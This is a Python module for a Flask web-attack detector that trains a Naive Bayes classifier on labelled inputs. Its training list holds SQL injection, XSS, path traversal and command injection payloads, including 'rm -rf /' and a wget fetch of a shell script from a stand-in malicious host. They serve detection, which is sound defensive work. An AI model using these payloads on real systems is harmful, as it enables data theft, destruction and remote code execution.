"""
FlaskGuard - ML Classifier (Naive Bayes)
Trained on common SQL injection + XSS payloads
"""

from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.naive_bayes import MultinomialNB
from sklearn.pipeline import Pipeline
import pickle
import os


TRAINING_DATA = [
    # Normal inputs (label=0)
    ("hello world", 0),
    ("admin login", 0),
    ("search query", 0),
    ("normal user input", 0),
    ("john doe", 0),
    ("product search laptop", 0),
    ("email@example.com", 0),
    ("my username is alice", 0),
    ("how are you doing today", 0),
    ("order number 12345", 0),
    ("contact form message", 0),
    ("select a country from list", 0),
    ("delete my account please", 0),
    ("insert coin to continue", 0),
    ("drop down menu selection", 0),

    # SQL Injection (label=1)
    ("' OR 1=1 --", 1),
    ("' OR '1'='1", 1),
    ("admin'--", 1),
    ("UNION SELECT password FROM users", 1),
    ("UNION ALL SELECT NULL,NULL--", 1),
    ("; DROP TABLE users--", 1),
    ("1; DELETE FROM accounts", 1),
    ("' AND SLEEP(5)--", 1),
    ("1 OR BENCHMARK(5000000,MD5(1))", 1),
    ("' EXEC xp_cmdshell('dir')--", 1),
    ("INSERT INTO admin VALUES('hacker','pass')", 1),
    ("1 UNION SELECT table_name FROM information_schema.tables", 1),
    ("' OR 1=1 LIMIT 1--", 1),

    # XSS (label=1)
    ("<script>alert('xss')</script>", 1),
    ("<img src=x onerror=alert(1)>", 1),
    ("javascript:void(0)", 1),
    ("<svg onload=alert(1)>", 1),
    ("';alert('XSS')//", 1),
    ("document.cookie", 1),
    ("<iframe src=javascript:alert('XSS')>", 1),
    ("eval(atob('YWxlcnQoMSk='))", 1),

    # Path Traversal (label=1)
    ("../../etc/passwd", 1),
    ("..\\..\\windows\\system32", 1),
    ("%2e%2e%2fetc%2fpasswd", 1),
    ("/etc/shadow", 1),

    # Command Injection (label=1)
    ("; ls -la", 1),
    ("| cat /etc/passwd", 1),
    ("`whoami`", 1),
    ("$(rm -rf /)", 1),
    ("& wget http://malicious.com/shell.sh", 1),
]

MODEL_PATH = os.path.join(os.path.dirname(__file__), "models", "classifier.pkl")


def train_model():
    texts, labels = zip(*TRAINING_DATA)
    pipeline = Pipeline([
        ("tfidf", TfidfVectorizer(analyzer="char_wb", ngram_range=(2, 4))),
        ("clf", MultinomialNB()),
    ])
    pipeline.fit(texts, labels)
    os.makedirs(os.path.dirname(MODEL_PATH), exist_ok=True)
    with open(MODEL_PATH, "wb") as f:
        pickle.dump(pipeline, f)
    return pipeline


def load_model():
    if os.path.exists(MODEL_PATH):
        with open(MODEL_PATH, "rb") as f:
            return pickle.load(f)
    return train_model()


# Load on import
_model = None

def get_model():
    global _model
    if _model is None:
        _model = load_model()
    return _model


def ml_detect(input_data: str) -> bool:
    if not input_data or len(input_data) < 3:
        return False
    try:
        model = get_model()
        prediction = model.predict([input_data])
        proba = model.predict_proba([input_data])[0]
        # Require >70% confidence to flag
        return prediction[0] == 1 and proba[1] > 0.70
    except Exception:
        return False


def ml_confidence(input_data: str) -> float:
    try:
        model = get_model()
        proba = model.predict_proba([input_data])[0]
        return round(float(proba[1]) * 100, 1)
    except Exception:
        return 0.0


# Pre-train on import
train_model()
